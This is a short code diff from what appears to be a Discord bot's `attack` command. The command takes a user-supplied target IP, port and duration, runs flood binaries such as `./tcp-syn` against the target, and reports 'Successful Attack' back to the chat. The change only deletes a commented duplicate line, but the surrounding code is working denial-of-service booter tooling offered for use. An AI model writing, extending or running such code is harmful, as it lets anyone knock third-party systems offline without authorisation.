@@ -144,7 +144,6 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         await ctx.send(f'Successful Attack TCP TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
     elif metodo == 'tcp-syn':
-        #OLD: comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
         comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'
         await ctx.send(f'Successful Attack TCP-SYN TargetIP:{ip} TargetPort:{port_int} Time:{tiempo_int}')
 
